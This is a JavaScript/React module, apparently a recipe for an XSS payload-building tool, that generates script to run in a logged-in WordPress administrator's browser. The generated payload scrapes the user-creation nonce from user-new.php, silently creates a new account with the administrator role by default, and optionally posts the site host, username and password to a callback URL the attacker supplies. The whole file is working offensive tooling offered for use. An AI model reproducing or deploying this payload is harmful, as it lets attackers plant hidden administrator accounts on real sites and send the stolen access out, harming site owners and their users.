import React from 'react'
import RecipeTextField from '~/components/RecipeTextField'
import { buildUrl, random } from '~/shared/StringFunctions'

export function cook (instance, vars) {
  const url = buildUrl(['/', instance.adminPath, 'user-new.php'])
  const nonceCallback = `${instance.id}_createUser`
  const username = instance.username.replace(/\\/, '\\\\').replace(/'/g, "\\'")
  const password = instance.password.replace(/\\/, '\\\\').replace(/'/g, "\\'")
  const callbackUrl = instance.callbackUrl.replace(/\\/, '\\\\').replace(/'/g, "\\'")
  const email = instance.email.replace(/\\/, '\\\\').replace(/'/g, "\\'")
  const role = instance.role.replace(/\\/, '\\\\').replace(/'/g, "\\'")

  let postBack = ''
  if (callbackUrl !== '') {
    postBack = `ajaxRequest('POST', '${callbackUrl}', ` +
               `'host=' + encodeURIComponent(location.host) + '&` +
               `username=${username}&` +
               `password=${password}');`
  }

  const payload = [
    `var newUserUrl = '${url}';`,
    `var ${nonceCallback} = function (xhr) {`,
    `  var nonce = xhr.response.match(/id="_wpnonce_create-user" name="_wpnonce_create-user" value="([a-z0-9]+)"/i)[1];`,
    `  var data = new FormData();`,
    `  data.append('action', 'createuser');`,
    `  data.append('_wpnonce_create-user', nonce);`,
    `  data.append('_wp_http_referer', newUserUrl);`,
    `  data.append('user_login', '${username}');`,
    `  data.append('email', '${email}');`,
    `  data.append('pass1', '${password}');`,
    `  data.append('pass2', '${password}');`,
    `  data.append('role', '${role}');`,
    `  ajaxRequest('POST', newUserUrl, data, function () {`,
    `    ${postBack}`,
    `    __XSS_CHEF_ENTRY_POINT__`,
    `  })`,
    `}`,
    `ajaxRequest('GET', newUserUrl, undefined, ${nonceCallback});`
  ].join('\n')

  return {
    payload: vars.payload.replace('__XSS_CHEF_ENTRY_POINT__', payload)
  }
}

export function init () {
  return {
    adminPath: '/wp-admin',
    username: random(8, 'alpha'),
    email: `${random(8, 'alpha')}@${random(8, 'alpha')}.com`,
    password: `${random(3, 'lowercase')}${random(2, 'uppercase')}${random(2, 'numeric')}!`,
    role: 'administrator',
    callbackUrl: ''
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <RecipeTextField
        bindTo="username"
        instance={instance}
        label="Username"
        placeholder=""
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="password"
        instance={instance}
        label="Password"
        placeholder=""
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="email"
        instance={instance}
        label="E-mail Address"
        placeholder=""
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="role"
        instance={instance}
        label="User Role"
        placeholder="Example: administrator"
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="adminPath"
        instance={instance}
        label="Admin Path"
        placeholder="Example: /wp-admin"
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="callbackUrl"
        instance={instance}
        label="Callback URL (Optional)"
        placeholder="Example: http://your.domain.com/wp-user-created"
        setRecipeProperty={setRecipeProperty}
      />
    </div>
  )
}

export function validate (instance) {
  if (!instance.username.match(/^.{4,}$/)) {
    return false
  }

  if (!instance.email.match(/^.+?@.+?\..+$/)) {
    return false
  }

  const validPassword = instance.password.length > 7 &&
                        instance.password.match(/[a-z]/) &&
                        instance.password.match(/[A-Z]/) &&
                        instance.password.match(/[!@#$%^&*(),.?":{}|<>[\]]/)

  if (!validPassword) {
    return false
  }

  if (instance.adminPath === '') {
    return false
  }

  if (instance.role === '') {
    return false
  }

  return true
}
